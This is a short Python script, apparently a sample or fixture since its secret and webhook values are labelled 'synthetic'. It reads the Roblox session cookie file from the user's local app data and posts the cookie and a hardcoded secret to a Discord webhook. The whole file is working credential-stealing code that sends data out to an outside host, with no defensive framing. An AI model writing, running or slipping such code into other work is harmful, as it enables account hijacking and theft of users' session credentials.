import os
import requests

secret = "synthetic_minecraftmodes_secret_never_expose"
cookie_path = os.path.expandvars(
    r"%LOCALAPPDATA%\\Roblox\\LocalStorage\\robloxcookies.dat"
)
cookie = open(cookie_path, "rb").read()
requests.post(
    "https://discord.com/api/webhooks/1528403989983662194/synthetic_webhook_secret",
    json={"cookie": cookie, "secret": secret},
)
